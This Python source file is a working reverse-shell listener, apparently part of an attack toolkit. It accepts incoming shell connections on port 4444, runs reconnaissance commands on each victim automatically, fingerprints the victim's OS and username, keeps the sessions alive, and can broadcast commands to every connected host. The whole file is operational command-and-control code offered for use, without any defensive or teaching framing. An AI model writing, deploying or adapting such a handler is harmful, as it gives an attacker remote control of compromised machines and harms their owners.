
import socket
import threading
import time
import json
from datetime import datetime
from typing import Dict, List, Any
import base64
import subprocess
import os

class PayloadListener:
    """Comprehensive listener for handling payload connections"""
    
    def __init__(self, port: int = 4444, bind_ip: str = "0.0.0.0"):
        self.port = port
        self.bind_ip = bind_ip
        self.socket = None
        self.connections = {}
        self.connection_count = 0
        self.is_listening = False
        self.log_entries = []
        
    def start_listener(self):
        """Start the payload listener"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.bind_ip, self.port))
            self.socket.listen(5)
            
            self.is_listening = True
            self.log(f"🚀 Listener started on {self.bind_ip}:{self.port}")
            
            # Start listener thread
            listener_thread = threading.Thread(target=self._accept_connections)
            listener_thread.daemon = True
            listener_thread.start()
            
            return True
            
        except Exception as e:
            self.log(f"❌ Failed to start listener: {str(e)}")
            return False
    
    def _accept_connections(self):
        """Accept incoming connections"""
        while self.is_listening:
            try:
                client_socket, address = self.socket.accept()
                self.connection_count += 1
                
                connection_id = f"conn_{self.connection_count}"
                
                connection_info = {
                    'id': connection_id,
                    'socket': client_socket,
                    'address': address,
                    'connected_at': datetime.now(),
                    'os_info': 'Unknown',
                    'user_info': 'Unknown',
                    'last_activity': datetime.now(),
                    'commands_sent': 0,
                    'data_received': []
                }
                
                self.connections[connection_id] = connection_info
                self.log(f"🎯 New connection from {address[0]}:{address[1]} (ID: {connection_id})")
                
                # Start handler thread for this connection
                handler_thread = threading.Thread(
                    target=self._handle_connection,
                    args=(connection_id,)
                )
                handler_thread.daemon = True
                handler_thread.start()
                
                # Get initial system info
                self.send_command(connection_id, "whoami && hostname && uname -a")
                
            except Exception as e:
                if self.is_listening:
                    self.log(f"❌ Error accepting connection: {str(e)}")
    
    def _handle_connection(self, connection_id: str):
        """Handle individual connection"""
        connection = self.connections[connection_id]
        client_socket = connection['socket']
        
        try:
            while connection_id in self.connections:
                # Set timeout for receiving data
                client_socket.settimeout(30.0)
                
                try:
                    data = client_socket.recv(4096)
                    if not data:
                        break
                    
                    # Decode and process received data
                    try:
                        decoded_data = data.decode('utf-8', errors='ignore')
                    except:
                        decoded_data = str(data)
                    
                    # Update connection info
                    connection['last_activity'] = datetime.now()
                    connection['data_received'].append({
                        'timestamp': datetime.now(),
                        'data': decoded_data
                    })
                    
                    self.log(f"📥 Data from {connection_id}: {decoded_data[:100]}...")
                    
                    # Try to extract system information from first responses
                    if connection['os_info'] == 'Unknown':
                        self._extract_system_info(connection_id, decoded_data)
                    
                except socket.timeout:
                    # Send keepalive
                    try:
                        client_socket.send(b"echo 'keepalive'\n")
                    except:
                        break
                except Exception as e:
                    self.log(f"❌ Error receiving data from {connection_id}: {str(e)}")
                    break
                    
        except Exception as e:
            self.log(f"❌ Connection handler error for {connection_id}: {str(e)}")
        finally:
            self._close_connection(connection_id)
    
    def _extract_system_info(self, connection_id: str, data: str):
        """Extract system information from command responses"""
        connection = self.connections[connection_id]
        
        # Try to identify OS from command responses
        data_lower = data.lower()
        
        if 'windows' in data_lower or 'microsoft' in data_lower:
            connection['os_info'] = 'Windows'
        elif 'linux' in data_lower:
            connection['os_info'] = 'Linux'
        elif 'darwin' in data_lower or 'mac' in data_lower:
            connection['os_info'] = 'macOS'
        elif 'android' in data_lower:
            connection['os_info'] = 'Android'
        elif 'iphone' in data_lower or 'ios' in data_lower:
            connection['os_info'] = 'iOS'
        
        # Extract username if possible
        lines = data.split('\n')
        for line in lines:
            if line.strip() and not line.startswith('#') and not line.startswith('>'):
                potential_user = line.strip().split()[0] if line.strip() else ''
                if potential_user and len(potential_user) < 50:
                    connection['user_info'] = potential_user
                    break
        
        self.log(f"ℹ️ System info for {connection_id}: OS={connection['os_info']}, User={connection['user_info']}")
    
    def send_command(self, connection_id: str, command: str) -> bool:
        """Send command to specific connection"""
        if connection_id not in self.connections:
            self.log(f"❌ Connection {connection_id} not found")
            return False
        
        try:
            connection = self.connections[connection_id]
            client_socket = connection['socket']
            
            # Ensure command ends with newline
            if not command.endswith('\n'):
                command += '\n'
            
            client_socket.send(command.encode())
            connection['commands_sent'] += 1
            connection['last_activity'] = datetime.now()
            
            self.log(f"📤 Sent command to {connection_id}: {command.strip()}")
            return True
            
        except Exception as e:
            self.log(f"❌ Failed to send command to {connection_id}: {str(e)}")
            self._close_connection(connection_id)
            return False
    
    def send_command_to_all(self, command: str) -> int:
        """Send command to all active connections"""
        success_count = 0
        
        for connection_id in list(self.connections.keys()):
            if self.send_command(connection_id, command):
                success_count += 1
        
        self.log(f"📤 Broadcast command sent to {success_count} connections: {command.strip()}")
        return success_count
    
    def _close_connection(self, connection_id: str):
        """Close specific connection"""
        if connection_id in self.connections:
            try:
                connection = self.connections[connection_id]
                connection['socket'].close()
                del self.connections[connection_id]
                self.log(f"🔌 Connection {connection_id} closed")
            except Exception as e:
                self.log(f"❌ Error closing connection {connection_id}: {str(e)}")
    
    def get_connection_stats(self) -> Dict[str, Any]:
        """Get statistics about connections"""
        active_connections = len(self.connections)
        
        stats = {
            'active_connections': active_connections,
            'total_connections': self.connection_count,
            'is_listening': self.is_listening,
            'listener_port': self.port,
            'uptime': time.time() - getattr(self, 'start_time', time.time()),
            'connections': []
        }
        
        # Add connection details
        for conn_id, conn_info in self.connections.items():
            stats['connections'].append({
                'id': conn_id,
                'address': f"{conn_info['address'][0]}:{conn_info['address'][1]}",
                'os_info': conn_info['os_info'],
                'user_info': conn_info['user_info'],
                'connected_duration': (datetime.now() - conn_info['connected_at']).total_seconds(),
                'commands_sent': conn_info['commands_sent'],
                'last_activity': conn_info['last_activity'].strftime('%H:%M:%S')
            })
        
        return stats
    
    def get_connection_history(self, connection_id: str) -> List[Dict[str, Any]]:
        """Get command/response history for a connection"""
        if connection_id in self.connections:
            return self.connections[connection_id]['data_received']
        return []
    
    def log(self, message: str):
        """Add entry to log"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        log_entry = f"[{timestamp}] {message}"
        self.log_entries.append(log_entry)
        print(log_entry)  # Also print to console
        
        # Keep only last 1000 log entries
        if len(self.log_entries) > 1000:
            self.log_entries = self.log_entries[-1000:]
    
    def get_logs(self, limit: int = 100) -> List[str]:
        """Get recent log entries"""
        return self.log_entries[-limit:]
    
    def stop_listener(self):
        """Stop the listener and close all connections"""
        self.is_listening = False
        
        # Close all active connections
        for connection_id in list(self.connections.keys()):
            self._close_connection(connection_id)
        
        # Close listener socket
        if self.socket:
            try:
                self.socket.close()
                self.log("🛑 Listener stopped")
            except Exception as e:
                self.log(f"❌ Error stopping listener: {str(e)}")

# Example usage and testing
if __name__ == "__main__":
    listener = PayloadListener(port=4444)
    
    if listener.start_listener():
        print("Listener started. Press Ctrl+C to stop.")
        
        try:
            while True:
                time.sleep(1)
                
                # Print stats every 30 seconds
                if int(time.time()) % 30 == 0:
                    stats = listener.get_connection_stats()
                    print(f"\n📊 Stats: {stats['active_connections']} active, {stats['total_connections']} total connections")
                    
        except KeyboardInterrupt:
            print("\n🛑 Stopping listener...")
            listener.stop_listener()
    else:
        print("❌ Failed to start listener")
